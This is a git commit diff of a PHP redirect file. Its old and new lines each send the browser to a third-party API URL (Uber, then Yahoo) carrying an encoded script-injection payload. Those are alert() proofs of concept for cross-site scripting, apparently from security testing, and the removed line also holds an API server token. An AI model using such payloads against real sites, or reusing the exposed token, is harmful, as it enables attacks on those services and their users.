40d59c0dd5dedd7c55e560e837b75b251818035a
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-22 01:36:09 +0100

    Update redir.php

--- redir.php
+++ redir.php
@@ -1,3 +1,3 @@
 <?php
-header('location: https://api.uber.com/v1/products?server_token=r3IFxM3lubYxjEIgBa2Z_3JQm8QnWdZYYPr2cW3t&latitude=%3C?xml%20version=%271.0%27?%3E%3Cx:script%20xmlns:x=%27http://www.w3.org/1999/xhtml%27%3Ealert(1%26%23x29%3b%3C/x:script%3E');
+header('location: http://api.view.yahoo.com/api/series/xxxxxa%3C%3fPXML%3E%3Chtml:script%3Ealert(document.domain)%3C%2fhtml:script%3E');
 ?>
